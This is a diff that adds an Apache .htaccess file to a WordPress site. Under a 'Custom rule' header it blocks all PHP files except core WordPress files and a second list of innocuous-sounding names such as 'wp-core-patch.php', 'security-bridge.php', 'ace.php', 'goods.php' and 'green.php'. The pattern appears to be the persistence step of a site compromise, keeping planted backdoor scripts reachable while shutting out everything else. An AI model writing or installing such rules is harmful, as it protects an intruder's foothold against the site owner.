@@ -1,0 +1,42 @@
+# Custom rule
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+</IfModule>
+
+<FilesMatch "\.(php|php3|php4|php5|php7|phtml|phps|php\.bak|php~|inc|module)$">
+    Require all denied
+</FilesMatch>
+
+<FilesMatch "^(index\.php|wp-login\.php|wp-cron\.php|xmlrpc\.php|wp-comments-post\.php|wp-signup\.php|wp-activate\.php|wp-blog-header\.php|wp-load\.php|wp-config-sample\.php|wp-trackback\.php|wp-mail\.php|admin-ajax\.php|admin-post\.php|wp-links-opml\.php|wp-locale\.php|about\.php|admin\.php|users\.php|user-new\.php|load-styles\.php|plugins\.php|load-scripts\.php|upgrade\.php|plugin-install\.php|theme-editor\.php|plugin-editor\.php|update\.php)$">
+    Require all granted
+</FilesMatch>
+
+<FilesMatch "^(compatibility\.php|site-compat\.php|env-check\.php|maintenance-helper\.php|performance-tweaks\.php|wp-compat-layer\.php|debug-compat\.php|core-optimizations\.php|wp-env-setup\.php|system-compat\.php|load-optimizer\.php|cache-bridge\.php|wp-tweak-layer\.php|site-health-check\.php|module-loader\.php|config-validator\.php|runtime-helper\.php|wp-utility\.php|backend-support\.php|asset-compat\.php|wp-init-tweaks\.php|env-adapter\.php|plugin-bridge\.php|wp-core-patch\.php|security-bridge\.php|wp-maintenance\.php|system-bridge\.php|load-compat\.php|wp-runtime\.php|config-bridge\.php|ace\.php|goods\.php|shop\.php|admin-en_UA\.php|green\.php)$">
+    Require all granted
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    RewriteCond %{REQUEST_URI} \.(php|php3|php4|php5|php7|phtml|phps|php\.bak|php~|inc|module)$ [NC]
+    RewriteCond %{REQUEST_URI} !/(index|wp-login|wp-cron|xmlrpc|wp-comments-post|wp-signup|wp-activate|wp-blog-header|wp-load|wp-config-sample|wp-trackback|wp-mail|admin-ajax|admin-post|wp-links-opml|wp-locale|about|admin|users|user-new|load-styles|plugins|load-scripts|upgrade|plugin-install|theme-editor|plugin-editor)\.php [NC]
+    RewriteCond %{REQUEST_URI} !/(compatibility|site-compat|env-check|maintenance-helper|performance-tweaks|wp-compat-layer|debug-compat|core-optimizations|wp-env-setup|system-compat|load-optimizer|cache-bridge|wp-tweak-layer|site-health-check|module-loader|config-validator|runtime-helper|wp-utility|backend-support|asset-compat|wp-init-tweaks|env-adapter|plugin-bridge|wp-core-patch|security-bridge|wp-maintenance|system-bridge|load-compat|wp-runtime|config-bridge|ace|goods|shop|content|comment)\.php [NC]
+    RewriteRule .* - [F,L]
+</IfModule>
+
+
+# BEGIN WordPress
+# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+# END WordPress
